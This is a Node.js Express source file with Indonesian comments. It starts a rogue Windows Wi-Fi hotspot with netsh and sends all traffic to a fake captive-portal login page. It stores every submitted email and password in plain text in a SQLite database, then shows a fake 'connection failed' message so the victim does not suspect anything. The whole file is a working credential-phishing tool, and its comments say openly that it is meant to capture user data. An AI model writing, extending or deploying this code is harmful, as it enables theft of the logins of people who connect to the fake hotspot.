const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const { exec } = require('child_process');
const app = express();

// Set Database
const db = new sqlite3.Database('./riset_keamanan.db');
db.run("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, email TEXT, password TEXT)");

app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));

// --- LOGIKA HOTSPOT WINDOWS ---
// Menjalankan perintah lewat Node.js
exec('netsh wlan set hostednetwork mode=allow ssid=YoHa_2 keyUsage=persistent');
exec('netsh wlan start hostednetwork');

// --- ROUTING ---

// 1. Halaman Login (Tujuan Redirect)
app.get('/login', (req, res) => {
    res.render('login');
});

// 2. Tangkap Data & Masukkan ke Database
app.post('/auth', (req, res) => {
    const { email, password } = req.body;
    
    db.run("INSERT INTO users (email, password) VALUES (?, ?)", [email, password], (err) => {
        if (err) return console.error(err.message);
        console.log(`[DATABASE] Berhasil menyimpan data dari: ${email}`);
    });

    res.send("<h1>Koneksi gagal, silakan hubungi administrator.</h1>");
});

// 3. CATCH-ALL REDIRECT (Solusi error path-to-regexp)
// Gunakan use() alih-alih get() untuk menghindari masalah regex
app.use((req, res) => {
    res.redirect('/login');
});

app.listen(80, '0.0.0.0', () => {
    console.log('Server Captive Portal berjalan di Port 80...');
    console.log('Siap menangkap data ke database.');
});